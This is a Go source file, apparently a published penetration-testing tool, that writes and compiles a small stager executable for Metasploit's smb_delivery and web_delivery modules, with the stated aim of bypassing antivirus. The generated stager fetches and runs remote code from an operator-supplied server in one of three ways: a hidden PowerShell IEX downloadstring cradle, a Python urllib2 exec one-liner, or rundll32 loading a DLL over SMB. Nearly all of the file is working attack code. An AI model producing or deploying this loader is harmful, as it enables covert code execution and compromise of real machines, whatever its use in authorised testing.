package main
/*
*  Copyright 2017 Stephen Haywood (AverageSecurityGuy)
*
*  This automates the process of creating Golang executables that will work
*  with the smb_delivery and web_delivery exploit modules in Metasploit. A
*  tutorial for using this script and the associated modules can be found at
*  https://averagesecurityguy.github.io/2017/01/06/bypassing-av-with-golang/
*/

import (
    "os"
    "fmt"
    "os/exec"
    "bufio"
)

func usage() {
    fmt.Println("Usage: stealth.go ps|py|smb server port dir")
    os.Exit(1)
}

func build() {
    _, err := exec.Command("go", "build", "shell.go").Output()

    if err != nil {
        fmt.Println("Could not build shell.")
        fmt.Println(err)
    }
}

func main() {
    if len(os.Args) != 5 {
        usage()
    }

    method := os.Args[1]
    server := os.Args[2]
    port := os.Args[3]
    dir := os.Args[4]
    file, err := os.Create("shell.go")
    out := bufio.NewWriter(file)

    if err != nil {
        fmt.Println("Could not create file.")
    }

    out.WriteString("package main\n\n")
    out.WriteString("import (\n")
    out.WriteString("    \"os/exec\"\n")
    out.WriteString(")\n\n")
    out.WriteString("func main() {\n")
   
    if method == "ps" {
        url := fmt.Sprintf("http://%s:%s/%s", server, port, dir)
        cmd := fmt.Sprintf("IEX ((new-object net.webclient).downloadstring('%s'))", url)

        out.WriteString(fmt.Sprintf("    cmd := \"%s\"\n", cmd))
        out.WriteString("    exec.Command(\"powershell.exe\", \"-nop\", \"-w\", \"hidden\", \"-c\", cmd).Run()\n")
    } else if method == "py" {
        url := fmt.Sprintf("http://%s:%s/%s", server, port, dir)
        cmd := fmt.Sprintf("import urllib2;r=urllib2.urlopen('%s');exec(r.read());", url)

        out.WriteString(fmt.Sprintf("    cmd := \"%s\"\n", cmd))
        out.WriteString("    exec.Command(\"python\", \"-c\", cmd).Run()\n")
    } else if method == "smb" {
        unc := fmt.Sprintf("\\\\\\\\%s\\\\%s\\\\test.dll,0", server, dir)
        
        out.WriteString(fmt.Sprintf("    unc := \"%s\"\n", unc))
        out.WriteString("    exec.Command(\"rundll32.exe\", unc).Run()\n")
    } else {
        usage()
    }

    out.WriteString("}\n")
    out.Flush()
    file.Close()

    build()
}
